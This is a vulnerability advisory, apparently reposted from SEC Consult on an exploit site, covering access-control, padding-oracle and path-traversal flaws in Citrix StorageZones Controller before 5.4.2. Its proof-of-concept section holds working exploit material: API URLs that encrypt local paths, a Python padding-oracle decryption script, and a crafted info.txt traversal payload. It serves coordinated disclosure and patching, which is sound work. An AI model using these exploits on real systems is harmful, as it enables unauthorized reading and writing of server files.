@@ -1,0 +1,227 @@
+id: 31198
+date: 09/27/2018
+title: Citrix StorageZones Controller Improper Access Restrictions / Traversal Exploit
+author: Wolfgang Ettlinger
+cves: CVE-2018-16968, CVE-2018-16969
+
+=======================================================================
+              title: Multiple Vulnerabilities
+            product: Citrix StorageZones Controller
+ vulnerable version: all versions before 5.4.2
+      fixed version: 5.4.2
+         CVE number: CVE-2018-16968, CVE-2018-16969
+             impact: Medium
+           homepage: https://www.citrix.com/
+              found: 2018-08
+                 by: W. Ettlinger (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Europe | Asia | North America
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"ShareFile is a file sharing service that enables users to easily and securely
+exchange documents. ShareFile Enterprise provides enterprise-class service and
+includes StorageZones Controller and the User Management Tool. ShareFile
+StorageZones Controller extends the ShareFile software as a service (SaaS)
+cloud storage by providing your ShareFile account with private data storage,
+referred to as StorageZones for ShareFile Data. [...]."
+
+URL: https://docs.citrix.com/en-us/storagezones-controller/5-0.html
+
+
+Business recommendation:
+------------------------
+Users of this product are advised to install the security patch provided by Citrix.
+
+The vulnerabilities identified suggest that no sufficient technical security
+audit has yet been conducted on the Citrix StorageZones Controller. SEC Consult
+recommends Citrix to conduct such an audit.
+
+
+Vulnerability overview/description:
+-----------------------------------
+The Citrix StorageZones Controller exposes resources that are typically only
+available to the internal network (e.g. CIFS Windows shares) to clients
+connecting from the Internet.
+
+In order to hide internal network paths from the user and in order to only allow
+access to paths specifically allowed by the administrator, internal network
+paths are encrypted. E.g. if an administrator wants to allow access to an UNC
+path (e.g. \\testhost\testshare\testdir) this string is encrypted and provided
+to the client. When the user calls the API to e.g. list the contents of this
+directory, the StorageZones Controller returns the encrypted absolute paths for
+each directory entry. This way, the absolute internal paths are always hidden
+from the user.
+
+1) Improper Access Restrictions
+Citrix StorageZone Controller offers users a functionality to convert UNC paths
+into their encrypted form. Therefore, users are able to access any UNC paths
+accessible by the StorageZones Controller.
+
+When providing access to a network share, the StorageZones Controller
+impersonates the user. Therefore, unauthorized access to network shares is not
+possible.
+
+However, Citrix StorageZones Controller internally does not distinguish between
+UNC-paths (e.g. \\testhost\testshare) and local paths (e.g. C:\Windows).
+Therefore, users may access (e.g. read, write, delete) local paths for which
+they have appropriate NTFS permissions.
+
+Note: Citrix StorageZones allows an administrator to define the paths exposed by
+the StorageZones Controller. By configuring this setting an administrator can
+restrict access to only network paths. The configuration page incorrectly states
+that a value of "*" (the default value) "allows connections to all hosts on the
+internal network", while in fact it also allows access to local paths.
+
+2) Padding Oracle
+The encryption mechanism used by the Citrix StorageZones Controller is
+vulnerable to a padding oracle attack. This allows an attacker to partly decrypt
+or potentially modify internal paths.
+
+3) Path Traversal
+The upload functionality is vulnerable to a path traversal attack if the
+preconditions to exploit the vulnerability #1 are met. In practice this
+vulnerability has a similar effect as vulnerability #1.
+
+
+Proof of concept:
+-----------------
+1) Improper Access Restrictions
+The following URL demonstrates how local paths can be encrypted:
+
+https://<host>/cifs/v3/Items/ByPath?path=c:\
+
+The following URL demonstrates how e.g. the contents of the directory can be
+listed:
+
+https://<host>/cifs/v3/Items(<encrypted>)?$expand=Children
+
+
+2) Padding Oracle
+The following script demonstrates how encrypted internal paths can partly be
+decrypted. It may also be possible to partly modify encrypted paths (this has
+not been verified).
+
+---- snip ----
+import sys
+sys.path.append('python-paddingoracle')
+
+from paddingoracle import BadPaddingException, PaddingOracle, xor
+from base64 import b64encode, b64decode
+from urllib import quote, unquote
+import requests
+import socket
+import time
+import getpass
+
+URL = 'http://<host>/'
+AUTH = (raw_input('User: '),
+        getpass.getpass('Password: '))
+
+CIPHER = '<encrypted path>'
+
+class PadBuster(PaddingOracle):
+    def __init__(self, **kwargs):
+        super(PadBuster, self).__init__(**kwargs)
+        self.session = requests.Session()
+
+    def oracle(self, data, **kwargs):
+        d = b64encode('B'*64 + encrypted + data)\
+            .replace('=', '_')\
+            .replace('+', '-')\
+            .replace('/', '!')
+
+        response = self.session.get(URL + 'cifs/v3/Items('+d+')',
+            headers={'Authorization': 'Basic '+b64encode(':'.join(AUTH))})
+
+        if 'File path could not be resolved.' in response.text:
+            print 'bad'
+            raise BadPaddingException
+
+if __name__ == '__main__':
+    import logging
+    logging.basicConfig(level=logging.DEBUG)
+
+    encrypted = bytearray(b64decode(CIPHER\
+        .replace('_', '=')\
+        .replace('-', '+')\
+        .replace('!', '/')))
+
+    padbuster = PadBuster()
+
+    d = b64encode(encrypted)\
+            .replace('=', '_')\
+            .replace('+', '-')\
+            .replace('/', '!')
+
+    print padbuster.decrypt(encrypted, block_size=16, iv=bytearray(16))
+---- snip ----
+
+
+3) Path Traversal
+This attack involves uploading a file called "info.txt" to any local path (see
+vulnerability #1). These info.txt files are used by StorageZones controller
+to keep track of ongoing file uploads (e.g. if a file upload is split into
+multiple HTTP requests).
+
+The following shows an info.txt file that can be used by an attacker:
+
+info_txt = 'ThreadedUpload|' + \
+    'rsu-00000000000000000000000000000000|' + \
+    'info.txt|0||00000000-0000-0000-00000000000000000|' + \
+    '5||False|' + \
+    r'..\dest_dir\testfile.txt|' + \ # the temporary upload file
+    'False|0|0|0|False|4|apiv3||';
+
+This value is then hashed (MD5 encoded as UTF16) and the resulting hash is
+appended (info_txt + '|' + hash).
+
+This file is normally expected to be in a dedicated temporary directory. When a
+request is made in reference to an ongoing file upload, a string identifying
+one specific upload is sent with it. When accessing the info.txt that describes
+the upload, the application uses the upload id sent as a part of the file path
+(<tmp upload path>/<upload id>/info.txt).
+
+An attacker can therefore conduct a directory traversal attack to reference
+the previously uploaded info.txt. Any uploaded chunk that references this
+file is appended to the temporary upload file (see info_txt above).
+
+This file is created with the privileges of the user NETWORK SERVICE. The data
+is then written to it with the privileges of the attacker's account.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The version 5.3.1.5610 of the StorageZones controller was found to be vulnerable.
+This was the latest version as of the time of vulnerability discovery.
+
+According to the vendor, all versions before 5.4.2 are affected by the identified
+security issues.
+
+
+Vendor contact timeline:
+------------------------
+2018-08-08: Sending encrypted advisory to the Citrix Security Team
+2018-08-08: Citrix: Investigation has been started
+2018-09-07: Requesting status update
+2018-09-07: Citrix: Preliminary release date for the patch: 2018-09-19
+2018-09-19: Citrix releases StorageZones Controller version 5.4.2 in which these
+            vulnerabilities are addressed
+2018-09-24: SEC Consult releases the security advisory
+
+
+Solution:
+---------
+Upgrade to the latest version available:
+https://www.citrix.com/downloads/sharefile/product-software/sharefile-storagezones-controller-542.html
+
+The Citrix security advisory can be found here:
+https://support.citrix.com/article/CTX238022
+
+#  0day.today [2023-03-27]  #
